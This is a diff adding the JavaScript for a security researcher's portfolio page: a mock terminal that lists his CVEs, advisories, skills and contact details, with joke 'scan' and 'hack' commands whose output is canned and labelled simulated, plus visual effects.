+      '├── <span class="acc">Advisories/</span> (5 GHSAs)\n' +
+      '├── <span class="acc">Lab/</span> (5 PoCs)\n' +
+      '├── <span class="acc">Experience/</span>\n' +
+      '├── <span class="acc">Education/</span>\n' +
+      '├── <span class="acc">Community/</span>\n' +
+      '├── about.txt\n├── skills.txt\n├── social.txt\n├── resume.txt\n└── contact.txt';
+  },
+  cves: function() {
+    return MY_CVES.map(function(c, i) {
+      var t = c.title.length > 45 ? c.title.slice(0,43) + '…' : c.title;
+      return '<span class="acc">' + String(i+1).padStart(2,'0') + '.</span> <span class="acc">' + c.id + '</span> <span class="sev ' + c.sev + '">' + c.sev + '</span> ' + c.tag + ', ' + esc(t);
+    }).join('\n') + '\n\n<span class="text-muted">Type \'cve <CVE-ID>\' for details.</span>';
+  },
+  cve: function(args) {
+    if (!args[0]) return '<span class="err">Usage: cve <CVE-ID></span>';
+    var c = MY_CVES.find(function(x) { return x.id.toLowerCase() === args[0].toLowerCase(); });
+    if (!c) return '<span class="err">Not found: ' + esc(args[0]) + '</span>';
+    return '<table class="cli-table">' +
+      '<tr><td>CVE ID</td><td><span class="acc">' + c.id + '</span></td></tr>' +
+      '<tr><td>Severity</td><td><span class="sev ' + c.sev + '">' + c.sev + '</span></td></tr>' +
+      '<tr><td>Product</td><td>' + c.tag + '</td></tr>' +
+      '<tr><td>Title</td><td>' + esc(c.title) + '</td></tr>' +
+      '<tr><td>Description</td><td>' + esc(c.desc) + '</td></tr>' +
+      '<tr><td>Metadata</td><td>' + esc(c.meta) + '</td></tr>' +
+      '<tr><td>URL</td><td><span class="cli-link" onclick="window.open(\'' + c.url + '\',\'_blank\')">' + c.url + '</span></td></tr>' +
+      '</table>';
+  },
+  advisories: function() {
+    return ADV_DATA.map(function(a, i) {
+      return '<span class="acc">' + String(i+1).padStart(2,'0') + '.</span> <span class="acc">' + a.id + '</span> <span class="sev ' + a.sev + '">' + a.sev + '</span> ' + a.repo + ' (' + a.cve + ')';
+    }).join('\n') + '\n\n<span class="text-muted">Type \'adv <GHSA-ID>\' for details.</span>';
+  },
+  adv: function(args) {
+    if (!args[0]) return '<span class="err">Usage: adv <GHSA-ID></span>';
+    var a = ADV_DATA.find(function(x) { return x.id.toLowerCase() === args[0].toLowerCase(); });
+    if (!a) return '<span class="err">Not found: ' + esc(args[0]) + '</span>';
+    return '<table class="cli-table">' +
+      '<tr><td>GHSA</td><td><span class="acc">' + a.id + '</span></td></tr>' +
+      '<tr><td>Severity</td><td><span class="sev ' + a.sev + '">' + a.sev + '</span></td></tr>' +
+      '<tr><td>Repo</td><td>' + a.repo + '</td></tr>' +
+      '<tr><td>CVE</td><td>' + a.cve + '</td></tr>' +
+      '<tr><td>Summary</td><td>' + esc(a.summary) + '</td></tr>' +
+      '<tr><td>URL</td><td><span class="cli-link" onclick="window.open(\'' + a.html + '\',\'_blank\')">' + a.html + '</span></td></tr>' +
+      '</table>';
+  },
+  theme: function(args) {
+    if (!args[0]) return 'Current: <span class="acc">' + document.documentElement.getAttribute('data-theme') + '</span>';
+    var t = args[0].toLowerCase();
+    if (THEMES.indexOf(t) !== -1) { setTheme(t); return '<span class="ok">✓ ' + t + '</span>'; }
+    return '<span class="err">Options: light, dark, hacker</span>';
+  },
+  matrix: function(args) {
+    if (!args[0]) { matrixEnabled = !matrixEnabled; return 'Matrix: <span class="acc">' + (matrixEnabled?'ON':'OFF') + '</span>'; }
+    if (args[0] === 'on') { matrixEnabled = true; return '<span class="ok">✓ on</span>'; }
+    if (args[0] === 'off') { matrixEnabled = false; return '<span class="ok">✓ off</span>'; }
+    return '<span class="err">Usage: matrix [on|off]</span>';
+  },
+  about: function() {
+    return 'Pavan Nallamothu, Security Researcher · Penetration Tester\n\n' +
+      'Offensive security researcher with 12 published CVEs across\n' +
+      'Apple, CISA, NSA, AutoGPT, yt-dlp and BlueprintUE. Active on\n' +
+      'HackerOne, Bugcrowd, Google VRP, Apple, Meta.\n\n' +
+      '4+ years as cloud/DevOps engineer (AWS, Docker, K8s, CI/CD).\n' +
+      'M.S. Cybersecurity, Pace University.\n' +
+      'ISC² NJ Chapter, CTF Committee member.\n' +
+      'Jersey City, NJ.';
+  },
+  skills: function() {
+    return '<span class="acc">Vulnerability Research</span>\n  Web pentesting, source-code auditing, auth/session analysis, threat modeling\n\n' +
+      '<span class="acc">Vulnerability Classes</span>\n  IDOR/BOLA, SSRF, SQLi, command injection, SSTI/RCE, auth bypass, XSS,\n  path traversal, insecure deserialization, memory-corruption triage\n\n' +
+      '<span class="acc">Tooling</span>\n  Burp Suite, nmap, ffuf/gobuster, sqlmap, Playwright, Semgrep,\n  custom Python/Bash PoC harnesses, hashcat/john\n\n' +
+      '<span class="acc">Languages</span>\n  Python, Bash, Go, JavaScript, C\n\n' +
+      '<span class="acc">Cloud & Infra</span>\n  AWS (EC2, S3, VPC, Lambda, IAM), Azure, Docker, Kubernetes, CI/CD, Linux';
+  },
+  social: function() {
+    return '<table class="cli-table">' +
+      '<tr><td>LinkedIn</td><td><span class="cli-link" onclick="window.open(\'https://linkedin.com/in/pavanchow\',\'_blank\')">linkedin.com/in/pavanchow</span></td></tr>' +
+      '<tr><td>GitHub</td><td><span class="cli-link" onclick="window.open(\'https://github.com/pavanchow\',\'_blank\')">github.com/pavanchow</span></td></tr>' +
+      '<tr><td>Email</td><td>pavankumarpre@gmail.com</td></tr>' +
+      '<tr><td>Phone</td><td>(551) 229-5068</td></tr>' +
+      '</table>';
+  },
+  contact: function() {
+    return '<table class="cli-table">' +
+      '<tr><td>Email</td><td>pavankumarpre@gmail.com</td></tr>' +
+      '<tr><td>Phone</td><td>(551) 229-5068</td></tr>' +
+      '<tr><td>LinkedIn</td><td><span class="cli-link" onclick="window.open(\'https://linkedin.com/in/pavanchow\',\'_blank\')">linkedin.com/in/pavanchow</span></td></tr>' +
+      '<tr><td>GitHub</td><td><span class="cli-link" onclick="window.open(\'https://github.com/pavanchow\',\'_blank\')">github.com/pavanchow</span></td></tr>' +
+      '</table>\n\n<span class="text-muted">For responsible disclosure, use GitHub Security Advisories.</span>';
+  },
+  resume: function() {
+    return 'Resume: <span class="cli-link" onclick="window.open(\'https://linkedin.com/in/pavanchow\',\'_blank\')">View on LinkedIn →</span>\n\n<span class="text-muted">12 CVEs · Apple · CISA · NSA · M.S. Cybersecurity</span>';
+  },
+  experience: function() {
+    return EXPERIENCE.map(function(e, i) {
+      return '<span class="acc">' + (i+1) + '.</span> <span class="acc">' + esc(e.role) + '</span>\n   ' + e.org + ' · ' + e.dates + '\n   ' + esc(e.bullets[0]);
+    }).join('\n\n');
+  },
+  education: function() {
+    return '<table class="cli-table">' +
+      '<tr><td>Degree</td><td>M.S. Cybersecurity</td></tr>' +
+      '<tr><td>University</td><td>Pace University, New York, NY</td></tr>' +
+      '<tr><td>Years</td><td>2023 - 2025</td></tr>' +
+      '<tr><td>Award</td><td>Graduate Merit Scholarship</td></tr>' +
+      '</table>';
+  },
+  certs: function() {
+    return CERTS.map(function(c, i) {
+      return '<span class="acc">' + String(i+1).padStart(2,'0') + '.</span> ' + esc(c);
+    }).join('\n');
+  },
+  community: function() {
+    return COMMUNITY.map(function(c, i) {
+      return '<span class="acc">' + String(i+1).padStart(2,'0') + '.</span> <span class="acc">' + esc(c.org) + '</span>, ' + esc(c.role) + '\n   ' + esc(c.desc);
+    }).join('\n\n');
+  },
+  projects: function() {
+    return '<table class="cli-table">' +
+      '<tr><td>1.</td><td><span class="acc">Apple macOS</span> (CVE-2026-43763), Sandbox file-read</td></tr>' +
+      '<tr><td>2.</td><td><span class="acc">NSA skills-service</span> (CVE-2026-63013/14), Priv esc + IDOR</td></tr>' +
+      '<tr><td>3.</td><td><span class="acc">CISA Malcolm</span> (CVE-2026-63177/34/33), RBAC bypass + path traversal + DoS</td></tr>' +
+      '<tr><td>4.</td><td><span class="acc">AutoGPT</span> (CVE-2026-33234), SSRF via SMTP</td></tr>' +
+      '<tr><td>5.</td><td><span class="acc">yt-dlp</span> (CVE-2026-50023), Dangerous file creation</td></tr>' +
+      '<tr><td>6.</td><td><span class="acc">BlueprintUE</span> (4 CVEs), Auth bypass, brute force, reset tokens, sessions</td></tr>' +
+      '</table>';
+  },
+  date: function() { return new Date().toString(); },
+  echo: function(args) { return esc(args.join(' ')); },
+  history: function() {
+    if (!cmdHistory.length) return '<span class="text-muted">(empty)</span>';
+    return cmdHistory.map(function(c, i) {
+      return '<span class="text-muted">' + String(i+1).padStart(3,' ') + '</span>  ' + esc(c);
+    }).join('\n');
+  },
+  clear: function() { cliOutput.innerHTML = ''; return null; },
+  cls: function() { cliOutput.innerHTML = ''; return null; },
+  exit: function() { return '<span class="warn">logout</span>\n<span class="text-muted">Just kidding. Type \'help\' to continue.</span>'; },
+  sudo: function(args) {
+    if (!args.length) return '<span class="err">usage: sudo [command]</span>';
+    return '<span class="err">[sudo] password for guest: </span>\n<span class="err">guest is not in the sudoers file. This incident will be reported.</span>';
+  },
+  scan: function(args) {
+    if (!args[0]) return '<span class="err">Usage: scan <host></span>';
+    return '<span class="acc">Starting Nmap 7.94 at ' + new Date().toISOString() + '</span>\n' +
+      'Nmap scan report for ' + esc(args[0]) + '\n' +
+      'Host is up (0.042s latency).\n' +
+      '<span class="acc">PORT</span>     <span class="acc">STATE</span>    <span class="acc">SERVICE</span>\n' +
+      '22/tcp   open     ssh\n' +
+      '80/tcp   open     http\n' +
+      '443/tcp  open     https\n' +
+      '3306/tcp open     mysql\n' +
+      '8080/tcp open     http-proxy\n' +
+      '9000/tcp open     cslistener\n\n' +
+      'Nmap done in 2.14s\n<span class="text-muted">(Simulated)</span>';
+  },
+  nmap: function(args) { return COMMANDS.scan(args); },
+  ping: function(args) {
+    if (!args[0]) return '<span class="err">Usage: ping <host></span>';
+    var h = args[0];
+    var lines = ['PING ' + esc(h) + ' (203.0.113.42): 56 data bytes'];
+    for (var i = 1; i <= 4; i++) {
+      lines.push('64 bytes from ' + esc(h) + ': icmp_seq=' + i + ' ttl=54 time=' + (Math.random()*40+10).toFixed(3) + ' ms');
+    }
+    lines.push('\n--- ' + esc(h) + ' ping statistics ---');
+    lines.push('4 packets transmitted, 4 received, 0.0% packet loss');
+    lines.push('<span class="text-muted">(Simulated)</span>');
+    return lines.join('\n');
+  },
+  hack: function(args) {
+    if (!args[0]) return '<span class="err">Usage: hack <target></span>';
+    return '<span class="warn">[*] Initializing framework v3.1.4...</span>\n' +
+      '<span class="acc">[*] Target: ' + esc(args[0]) + '</span>\n' +
+      '<span class="text-muted">[*] Loading exploit modules... done</span>\n' +
+      '<span class="ok">[+] CVE-2026-33234 (SSRF), EXPLOITABLE</span>\n' +
+      '<span class="ok">[+] CVE-2026-63013 (PrivEsc), EXPLOITABLE</span>\n' +
+      '<span class="warn">[!] 2 vulnerabilities found</span>\n' +
+      '<span class="acc">[*] Deploying payload...</span>\n' +
+      '<span class="err">[!] ACCESS DENIED, responsible disclosure required</span>\n\n' +
+      '<span class="text-muted">Just kidding. I report vulnerabilities responsibly.</span>';
+  },
+  whois: function(args) {
+    if (!args[0]) return '<span class="err">Usage: whois <domain></span>';
+    return 'Domain: ' + esc(args[0]) + '\nRegistrar: Responsible Disclosure Inc.\nRegistrant: Pavan Nallamothu\nLocation: Jersey City, NJ\n\n<span class="text-muted">(Simulated)</span>';
+  },
+  man: function(args) {
+    if (!args[0]) return '<span class="err">Type \'help\' instead.</span>';
+    var s = {scan:'scan, simulated nmap',hack:'hack, simulated attack framework',cve:'cve, display CVE details',theme:'theme, switch themes',matrix:'matrix, toggle digital rain'};
+    return s[args[0]] || '<span class="err">No manual entry for ' + esc(args[0]) + '</span>';
+  }
+};
+
+function executeCommand(input) {
+  var trimmed = input.trim();
+  if (!trimmed) return;
+
+  cmdHistory.push(trimmed);
+  if (cmdHistory.length > 50) cmdHistory.shift();
+  historyIdx = cmdHistory.length;
+
+  var cmdDiv = document.createElement('div');
+  cmdDiv.className = 'cli-cmd-line';
+  cmdDiv.innerHTML = '<span class="cli-prompt">guest@pavan-blog:~$</span> ' + esc(trimmed);
+  cliOutput.appendChild(cmdDiv);
+
+  var pipes = trimmed.split('|').map(function(p) { return p.trim(); });
+  var output = '';
+
+  for (var pi = 0; pi < pipes.length; pi++) {
+    var parts = pipes[pi].split(/\s+/);
+    var cmd = parts[0].toLowerCase();
+    var args = parts.slice(1);
+
+    if (COMMANDS[cmd]) {
+      var result = COMMANDS[cmd](args);
+      if (result === null) { cliOutput.innerHTML = ''; return; }
+      if (typeof result === 'string') output = result;
+    } else if (cmd === '') {
+      continue;
+    } else if (cmd === 'grep') {
+      if (!args[0] || !output) { output = '<span class="err">grep: no pattern</span>'; break; }
+      var pat = args[0].toLowerCase();
+      output = output.split('\n').filter(function(l) { return l.toLowerCase().indexOf(pat) !== -1; }).join('\n');
+    } else if (cmd === 'wc') {
+      output = output.split('\n').length + ' lines, ' + output.split(/\s+/).filter(Boolean).length + ' words';
+    } else if (cmd === 'head') {
+      output = output.split('\n').slice(0, parseInt(args[0]) || 5).join('\n');
+    } else if (cmd === 'tail') {
+      output = output.split('\n').slice(-(parseInt(args[0]) || 5)).join('\n');
+    } else {
+      output = '<span class="err">command not found: ' + esc(cmd) + '. Type \'help\'.</span>';
+      break;
+    }
+  }
+
+  if (output) {
+    var outDiv = document.createElement('div');
+    outDiv.className = 'cli-output-line';
+    outDiv.innerHTML = output;
+    cliOutput.appendChild(outDiv);
+  }
+
+  cliBody.scrollTop = cliBody.scrollHeight;
+}
+
+cliInput.addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') {
+    executeCommand(cliInput.value);
+    cliInput.value = '';
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (historyIdx > 0) { historyIdx--; cliInput.value = cmdHistory[historyIdx] || ''; }
+  } else if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (historyIdx < cmdHistory.length - 1) { historyIdx++; cliInput.value = cmdHistory[historyIdx] || ''; }
+    else { historyIdx = cmdHistory.length; cliInput.value = ''; }
+  } else if (e.key === 'Tab') {
+    e.preventDefault();
+    var val = cliInput.value.toLowerCase().trim();
+    if (!val) return;
+    var parts = val.split(/\s+/);
+    if (parts.length === 1) {
+      var matches = Object.keys(COMMANDS).filter(function(c) { return c.indexOf(parts[0]) === 0; });
+      if (matches.length === 1) { cliInput.value = matches[0] + ' '; }
+    }
+  } else if (e.key === 'Escape') {
+    cliInput.value = '';
+  }
+});
+
+cliBody.addEventListener('click', function() { cliInput.focus(); });
+
+var cliGreeted = false;
+cliInput.addEventListener('focus', function() {
+  if (!cliGreeted) {
+    cliGreeted = true;
+    setTimeout(function() {
+      var g = document.createElement('div');
+      g.className = 'cli-output-line';
+      g.style.color = 'var(--text-muted)';
+      g.innerHTML = 'Welcome. Type <span class="acc">help</span> to begin.\nTry <span class="acc">banner</span>, <span class="acc">neofetch</span>, <span class="acc">cves</span>, or <span class="acc">experience</span>.\n';
+      cliOutput.appendChild(g);
+      cliBody.scrollTop = cliBody.scrollHeight;
+    }, 100);
+  }
+});
+
+/* ====== MATRIX RAIN ====== */
+var matrixCanvas = document.getElementById('matrix-canvas');
+var matrixCtx = matrixCanvas.getContext('2d');
+var matrixDrops = [];
+var matrixFontSize = 14;
+var matrixCols = 0;
+
+function resizeMatrix() {
+  matrixCanvas.width = matrixCanvas.offsetWidth;
+  matrixCanvas.height = matrixCanvas.offsetHeight;
+  matrixCols = Math.floor(matrixCanvas.width / matrixFontSize);
+  matrixDrops = Array(matrixCols).fill(1).map(function() { return Math.random() * -100; });
+}
+window.addEventListener('resize', resizeMatrix);
+resizeMatrix();
+
+function drawMatrix() {
+  if (!matrixEnabled || document.documentElement.getAttribute('data-theme') === 'light') {
+    matrixCtx.clearRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+    return;
+  }
+  var bgColor = document.documentElement.getAttribute('data-theme') === 'hacker' ? 'rgba(0,0,0,0.05)' : 'rgba(13,17,23,0.05)';
+  matrixCtx.fillStyle = bgColor;
+  matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+  matrixCtx.fillStyle = window.getComputedStyle(document.documentElement).getPropertyValue('--accent').trim();
+  matrixCtx.font = matrixFontSize + 'px JetBrains Mono';
+  for (var i = 0; i < matrixDrops.length; i++) {
+    var text = chars[Math.floor(Math.random() * chars.length)];
+    matrixCtx.fillText(text, i * matrixFontSize, matrixDrops[i] * matrixFontSize);
+    if (matrixDrops[i] * matrixFontSize > matrixCanvas.height && Math.random() > 0.975) matrixDrops[i] = 0;
+    matrixDrops[i]++;
+  }
+}
+setInterval(drawMatrix, 50);
+
+/* ====== KONAMI CODE ====== */
+var konami = ['arrowup','arrowup','arrowdown','arrowdown','arrowleft','arrowright','arrowleft','arrowright','b','a'];
+var konamiIdx = 0;
+document.addEventListener('keydown', function(e) {
+  if (document.activeElement === cliInput) return;
+  var key = e.key.toLowerCase();
+  if (key === konami[konamiIdx]) {
+    konamiIdx++;
+    if (konamiIdx === konami.length) {
+      document.getElementById('breach-overlay').classList.add('show');
+      konamiIdx = 0;
+    }
+  } else {
+    konamiIdx = 0;
+  }
+});
+document.getElementById('breach-close').addEventListener('click', function() {
+  document.getElementById('breach-overlay').classList.remove('show');
+});
+
+document.getElementById('year').textContent = new Date().getFullYear();
+
+/* ====== CVE INFINITE MARQUEE ====== */
+(function(){
+  var track = document.getElementById('cve-grid');
+  if (!track) return;
+  track.innerHTML += track.innerHTML;   // duplicate cards so translateX(-50%) loops seamlessly
+})();
+</script>
+<script>
+(function(){
+  var reduce=window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  document.querySelectorAll('.rec-scroll').forEach(function(sc){
+    var jog=sc.parentElement?sc.parentElement.querySelector('.rec-jog-knob'):null;
+    var marquee=sc.hasAttribute('data-marquee');
+    if(marquee){[].slice.call(sc.children).forEach(function(c){var cl=c.cloneNode(true);cl.setAttribute('aria-hidden','true');sc.appendChild(cl);});}
+    var d=false,sx=0,sl=0,mv=false,hover=false,kd=false;
+    function half(){return sc.scrollWidth/2;}
+    function wrap(){if(!marquee)return;var h=half();if(h>0){if(sc.scrollLeft>=h)sc.scrollLeft-=h;else if(sc.scrollLeft<0)sc.scrollLeft+=h;}}
+    function ed(){d=false;sc.classList.remove('dragging');}
+    sc.addEventListener('pointerdown',function(e){if(e.target.closest('a'))return;d=true;mv=false;sx=e.clientX;sl=sc.scrollLeft;sc.classList.add('dragging');try{sc.setPointerCapture(e.pointerId)}catch(_){}});
+    sc.addEventListener('pointermove',function(e){if(!d)return;if(e.buttons===0){ed();return;}var dx=e.clientX-sx;if(Math.abs(dx)>3)mv=true;sc.scrollLeft=sl-dx;if(marquee){var h=half();if(h>0){if(sc.scrollLeft>=h){sc.scrollLeft-=h;sl-=h;}else if(sc.scrollLeft<=0){sc.scrollLeft+=h;sl+=h;}}}});
+    window.addEventListener('pointerup',ed);window.addEventListener('pointercancel',ed);
+    sc.addEventListener('click',function(e){if(mv){e.preventDefault();e.stopPropagation();mv=false;}},true);
+    sc.addEventListener('mouseenter',function(){hover=true;});
+    sc.addEventListener('mouseleave',function(){hover=false;});
+    sc.querySelectorAll('.card').forEach(function(card){var lk=card.querySelector('.card-meta a[href]');if(!lk)return;var url=lk.href;card.addEventListener('click',function(e){if(e.target.closest('a'))return;window.open(url,'_blank','noopener');});});
+    if(marquee&&!reduce){(function auto(){if(!(d||kd||hover)){sc.scrollLeft+=0.5;wrap();}requestAnimationFrame(auto);})();}
+    if(jog){
+      var kx=0,vel=0,raf=0,MAX=40,SPD=14;
+      function loop(){if(!kd)return;sc.scrollLeft+=vel;wrap();raf=requestAnimationFrame(loop);}
+      function ke(){kd=false;vel=0;cancelAnimationFrame(raf);jog.classList.remove('grabbing');sc.classList.remove('dragging');jog.style.transform='';}
+      jog.addEventListener('pointerdown',function(e){kd=true;kx=e.clientX;vel=0;jog.classList.add('grabbing');sc.classList.add('dragging');try{jog.setPointerCapture(e.pointerId)}catch(_){}cancelAnimationFrame(raf);raf=requestAnimationFrame(loop);e.preventDefault();});
+      jog.addEventListener('pointermove',function(e){if(!kd)return;if(e.buttons===0){ke();return;}var dx=e.clientX-kx;var c=Math.max(-MAX,Math.min(MAX,dx));jog.style.transform='translateX('+c+'px)';vel=(c/MAX)*SPD;});
+      window.addEventListener('pointerup',ke);window.addEventListener('pointercancel',ke);window.addEventListener('blur',ke);
+      jog.addEventListener('keydown',function(e){if(e.key==='ArrowRight'){sc.scrollBy({left:340,behavior:'smooth'});e.preventDefault();}else if(e.key==='ArrowLeft'){sc.scrollBy({left:-340,behavior:'smooth'});e.preventDefault();}});
+    }
+  });
+})();
+</script>
+</body>
+</html>
